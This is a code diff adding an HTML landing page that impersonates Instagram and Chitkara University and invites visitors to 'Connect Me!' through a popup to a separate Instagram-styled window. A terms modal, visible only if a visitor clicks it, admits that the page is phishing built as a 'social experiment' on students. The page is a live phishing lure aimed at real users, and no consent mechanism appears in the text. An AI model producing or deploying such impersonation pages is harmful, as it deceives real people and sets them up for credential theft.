@@ -1,0 +1,109 @@
+<html>
+<head>
+<!-- 	bootstrap link-->	
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<!-- JS Scripts -->
+	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+	</body>
+
+	<style>
+			*{box-sizing:border-box;}
+		body{
+			
+
+			margin: 0 auto;
+    		padding: 0 auto;
+		}
+		.header{
+			background-color: #ff4c4c;
+		}
+		.bdy {
+			background-color: #F0F0F0;
+			padding: 0 16px;
+			margin:0 70px;
+			 box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+			 font-family: 'Baloo Tamma 2', cursive;
+		}
+
+
+		.footer {
+		  position: relative;
+		  left: 0;
+		  bottom: 0;
+		  margin-top: 50px;
+		  width: 100%;
+		  text-align: center;
+		}
+
+		.footer p a {
+		  color: #003569;
+		  text-decoration: none;
+		  padding-left: 10px;
+		  font-size: 13px;
+		}
+
+		.footer p span {
+		  color: rgb(189, 186, 186);
+		  padding-left: 80px;
+		  font-size: 13px;
+		}
+				
+	</style>
+	<script>
+		$(document).ready(function(){
+			$("#cnct").click(function(){
+				windowFnctn="menubar=no,width=500,height=750"
+				const windoww=window.open("instagramWindow.html","_blank",windowFnctn)
+			})
+		})
+	</script>
+	</head>
+	<body>
+		<div class="header pt-3">
+			<div class="row justify-content-center">
+			<img class="chitkara col-*  p-3 " src="chitkaralogowhite.png" width="150px" height="100px">
+		<img class=" instagram col-* p-3 " src="instagramlogo.png" width="100px" height="100px">
+		</div>
+		</div>
+
+		<div class="bdy text-center">
+			<p class=" p-2">This Web Application Tries To Connect Your Instagram With Chitkara University And Provides Extra Features*<br><br>
+				Provides Addtional Features Such As Classifying Images Clicked In Chitkara University According To Location and Provides Insight In Internal Event*<br><br>
+				Hope You Like It!&nbsp&nbsp<img src="hearts.gif" width="20px"></p>
+
+				<button type="Button" class="btn btn-primary m-3" id="cnct">Connect Me!</button>
+		</div>
+<br><br><br><br>
+<!-- FOOTER -->
+
+	<div class="footer">
+  				    <p style="cursor: pointer" data-toggle="modal" data-target="#myModal">Terms and Conditions</p>
+
+    <!-- The Modal -->
+    <div class="modal" id="myModal">
+      <div class="modal-dialog">
+        <div class="modal-content">
+
+
+          <!-- Modal body -->
+          <div class="modal-body">
+            This is a phishing page.<br>
+           	Chitkara University is not associated with this Social Experiment by any means.<br>
+           	This is to proove that the educated people even in the CSE branch can be fooled easily by a similar looking page.
+          </div>
+
+          <!-- Modal footer -->
+          <div class="modal-footer">
+            <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+  </div>
+		</div>
+
+</html>
